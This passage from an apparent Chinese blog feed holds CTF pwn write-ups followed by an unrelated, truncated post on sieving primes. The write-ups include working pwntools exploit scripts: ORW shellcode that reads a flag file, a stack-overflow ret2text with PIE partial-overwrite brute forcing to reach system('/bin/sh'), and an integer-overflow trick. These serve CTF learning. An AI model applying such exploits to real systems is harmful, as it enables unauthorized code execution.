<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- parm zone --------------------------------------------------------#</span></span><br><span class="line">context.terminal    =   [<span class="string">'gnome-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line">context.log_level   =   <span class="string">'debug'</span></span><br><span class="line">context.os          =   <span class="string">'linux'</span></span><br><span class="line">context.arch        =   <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- functions for quick script ---------------------------------------#</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)  <span class="comment"># in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :sh.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :sh.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :sh.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :sh.recvuntil(delims, drop)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :sh.recvuntil(<span class="string">b'\n'</span>).strip(<span class="string">b'\n'</span>)</span><br><span class="line">irt     = <span class="keyword">lambda</span>                    :sh.interactive()</span><br><span class="line">rs      = <span class="keyword">lambda</span> *args, **kwargs    :sh.start(*args, **kwargs)</span><br><span class="line">dbg     = <span class="keyword">lambda</span> gs=<span class="string">''</span>, **kwargs    :sh.debug(gdbscript=gs, **kwargs)</span><br><span class="line">rm      = <span class="keyword">lambda</span>                    :io.recvuntil(rmflag)</span><br><span class="line">og      = <span class="keyword">lambda</span> path=null          :<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,libc.path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>))) <span class="keyword">if</span> path == null <span class="keyword">else</span> <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,subprocess.check_output([<span class="string">'one_gadget'</span>,<span class="string">'--raw'</span>,<span class="string">'-f'</span>,path]).decode().strip(<span class="string">'\n'</span>).split(<span class="string">' '</span>)))</span><br><span class="line">clear   = <span class="keyword">lambda</span>                    :os.system(<span class="string">'clear'</span>)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b'\0'</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">'\x1b[01;38;5;214m{} = {:#x}\x1b[0m'</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">li      = <span class="keyword">lambda</span> x                  :log.info(<span class="string">'\x1b[01;38;5;214m'</span> + x + <span class="string">'\x1b[0m'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------------------------- func zone --------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb attach</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">""</span></span>):</span><br><span class="line">    gdb.attach(sh,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote or local </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proloc</span>(<span class="params">elf_addr,libc_addr,pro_libc</span>):</span><br><span class="line">    <span class="keyword">global</span> sh, elf, libc</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> :</span><br><span class="line">        ip      =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        prot    =   sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        sh      =   remote(ip,prot)</span><br><span class="line">        libc    =   pro_libc</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh      =   process(elf_addr) </span><br><span class="line">        elf     =   ELF(elf_addr)</span><br><span class="line">        libc    =   elf.libc    <span class="comment">#ELF(libc_addr, checksec=False)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------------------------------- code zone --------------------------------------------------------#</span></span><br><span class="line"><span class="comment"># ORW</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># debug()</span></span><br><span class="line">    code = [</span><br><span class="line">        asm(<span class="string">'mov rdx, 0x100'</span>),</span><br><span class="line">        asm(<span class="string">'xor rax, rax'</span>),</span><br><span class="line">        asm(<span class="string">'syscall'</span>),</span><br><span class="line">    ]</span><br><span class="line">    payload1 =  <span class="string">b""</span>.join(code)</span><br><span class="line">    sa(<span class="string">"you can input only 13 messages:\n"</span>, payload1)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    payload2 = (flat(<span class="string">b'\x90'</span>*<span class="built_in">len</span>(payload1), asm(shellcraft.<span class="built_in">open</span>(<span class="string">"flag"</span>)), asm(shellcraft.read(<span class="string">"rax"</span>, <span class="string">"rsp"</span>, <span class="number">0x100</span>)), asm(shellcraft.write(<span class="number">1</span>, <span class="string">"rsp"</span>, <span class="number">0x100</span>)))).ljust(<span class="number">0x100</span>, <span class="string">b'\x00'</span>)</span><br><span class="line">    sl(payload2)</span><br><span class="line">    sh.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    elf_addr    =   <span class="string">'./ssssssn'</span>                         <span class="comment"># local ELF</span></span><br><span class="line">    libc_addr   =   <span class="string">''</span>                                  <span class="comment"># local Libc</span></span><br><span class="line">    pro_libc    =   <span class="string">''</span>                                  <span class="comment"># remote Libc</span></span><br><span class="line">    proloc(elf_addr, libc_addr, pro_libc)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="animal"><a href="#animal" class="headerlink" title="animal"></a>animal</h2><ol>
<li><p>checkseck发现开启了堆栈不可执行和地址随机化</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192045.png"></p>
</li>
<li><p>IDA分析为C++编写，getAnimal函数可以泄露地址，backdoor函数存在栈溢出漏洞，shell函数可以执行system命令。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192108.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192119.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192131.png"></p>
</li>
<li><p>输入的内容不为1或2，跳转至backdoor函数，利用栈溢出ret2text，跳转到system(‘/bin/sh’)的地址即可命令执行。由于开启了PIE，shell最后三位地址不变，因此我们可以通过覆盖地址的后3位实现跳转至shell函数。由于至少要覆盖4位，倒数第四位需要爆破，爆破范围在0到0xf。</p>
</li>
<li><p>脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># gdb.attach(p,"b backdoor")</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">list1 = [<span class="string">"\x05"</span>,<span class="string">"\x15"</span>,<span class="string">"\x25"</span>,<span class="string">"\x35"</span>,<span class="string">"\x45"</span>,<span class="string">"\x55"</span>,<span class="string">"\x65"</span>,<span class="string">"\x75"</span>,<span class="string">"\x85"</span>,<span class="string">"\x95"</span>,<span class="string">"\xa5"</span>,<span class="string">"\xb5"</span>,<span class="string">"\xc5"</span>,<span class="string">"\xd5"</span>,<span class="string">"\xe5"</span>,<span class="string">"\xf5"</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    sh = process(<span class="string">'./animal'</span>)</span><br><span class="line">    payload = <span class="string">'A'</span> * <span class="number">16</span>+<span class="string">'BBBBBBBB'</span>+<span class="string">'\x66'</span>+random.sample(list1,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">    sh.sendafter(<span class="string">"3.show\n"</span>,<span class="string">'11'</span>)</span><br><span class="line">    sh.sendafter(<span class="string">"leave lase message\n"</span>, payload)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sh.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sh.interactive()</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><ol>
<li><p>IDA分析发现需使int型变量<code>v4&lt;=5 &amp;&amp; v4-1&gt;5</code>才能执行系统命令。显然是整数溢出，输入最小的int型整数（-2147483648）即可。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192258.png"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20221127192314.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>打印素数</title>
    <url>/%E6%89%93%E5%8D%B0%E7%B4%A0%E6%95%B0.html</url>
    <content><![CDATA[<h1 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h1><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.452ex;" xmlns="http://www.w3.org/2000/svg" width="18.642ex" height="2.339ex" role="img" focusable="false" viewBox="0 -833.9 8239.7 1033.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(936.6,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msup" transform="translate(1936.6,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3226.7,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="mo" transform="translate(4448.9,0)"><path data-c="B7" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(4949.1,0)"><path data-c="B7" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mo" transform="translate(5449.3,0)"><path data-c="B7" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(5949.5,0)"><g data-mml-node="mo"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">、</text></g></g><g data-mml-node="msup" transform="translate(6949.5,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> 多个范围内素数列表.<span id="more"></span></p>
<h1 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h1><ul>
<li>编程语言：C（底层语言，耗时最少）</li>
<li>运行系统：Windows 10</li>
<li>方法：埃拉托斯特尼筛法（将每个素数的倍数标记为合数，时间和空间利用率强于试除法）</li>
</ul>
<h1 id="程序运行结果"><a href="#程序运行结果" class="headerlink" title="程序运行结果"></a>程序运行结果</h1><p>理论上可以打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.904ex" role="img" focusable="false" viewBox="0 -841.7 1290.1 841.7"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有素数到prime文件，但是由于个人电脑的性能问题，只打印到了<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.885ex" role="img" focusable="false" viewBox="0 -833.2 1290.1 833.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container> .</p>
<ol>
<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.119ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 936.6 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mn" transform="translate(533,363) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></svg></mjx-container>以内的所有质数，耗时0.000997s；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170604.png"></p>
</li>
<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有质数，耗时0.000998s；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170619.png"></p>
</li>
<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有质数，耗时0.001995s；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170628.png"></p>
</li>
<li><p>打印<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="2.919ex" height="1.887ex" role="img" focusable="false" viewBox="0 -833.9 1290.1 833.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>以内的所有质数，耗时0.031910s；</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200420170638.png"></p>
</li>
